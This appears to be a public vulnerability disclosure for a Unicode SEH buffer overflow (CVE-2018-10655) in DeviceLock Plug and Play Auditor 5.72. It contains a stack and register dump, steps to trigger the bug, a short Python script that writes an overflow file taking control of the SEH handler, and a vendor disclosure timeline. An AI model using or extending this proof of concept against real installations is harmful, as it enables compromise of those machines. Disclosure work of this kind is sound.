@@ -1,0 +1,85 @@
+# Exploit Title: DeviceLock Plug and Play Auditor 5.72 - Unicode Buffer Overflow (SEH)
+# Date: 2018-05-04
+# Exploit Author: Youssef mami
+# Vendor Homepage: https://www.devicelock.com/freeware.html/
+# Version: 5.72
+# CVE : CVE-2018-10655
+
+# Security Issue:
+
+DeviceLock Plug and Play Auditor "DLPnpAuditor.exe" is vulnerable to a Unicode type of buffer overflow, when supplied a specially crafted textfile using the "scan network" from file option.
+The buffer overload payload will get converted to unicode character encoding. Unicode support is used by applications for internationalization purposes allowing a consistent way to visually
+represent different character sets on most systems around the world. 
+
+e.g.
+
+Before our buffer overflow payload was put on the stack it was expanded with 0x00 so "RRRR" transforms to Unicode representation of "00520052"
+(52 is HEX for Ascii char R) containing 0's (NULL) values. Therefore, attempting to exploit the vulnerable program needs an unicode compatiable address
+(address with null bytes) and using encoding methods like "alpha2" encoder tool.
+
+Stack dump:
+
+SEH chain of main thread
+Address    SE handler
+0018EE00   ntdll.771B34DD
+0018FBD4   00520052
+00520052   A42F0000
+E5C1411F   *** CORRUPT ENTRY ***
+
+EAX 00000000
+ECX 00520052
+EDX 771B34DD ntdll.771B34DD
+EBX 00000000
+ESP 0018EDEC
+EBP 0018EE0C
+ESI 00000000
+EDI 00000000
+EIP 00520052
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 1  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 1  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00210246 (NO,NB,E,BE,NS,PE,GE,LE)
+ST0 empty g
+ST1 empty g
+ST2 empty g
+ST3 empty g
+ST4 empty g
+ST5 empty g
+ST6 empty g
+ST7 empty g
+               3 2 1 0      E S P U O Z D I
+FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+
+# Exploit/POC:
+
+1) Create POC textfile
+2) Under File menu "Scan Network" choose "From file" under drop down menu.
+3) Choose the exploit file select the Scan "Domain" box and run it.
+
+#Unicode SEH Buffer Overflow
+#https://www.devicelock.com/download/
+
+PAYLOAD="A"*1036+"R"*8+"B"*56      #Control SEH
+file=open("devicelock-bof.txt","w")
+file.write(PAYLOAD)
+file.close()
+
+print 'DeviceLock Plug and Play Auditor v5.72 (freeware)'
+print 'Exploit POC file created.'
+print 'hyp3rlinx'
+
+
+# Disclosure Timeline:
+Vendor Notification:  April 17, 2018
+No reply
+Vendor Notification: April 22, 2018
+No reply
+May 6, 2018 : Public Disclosure
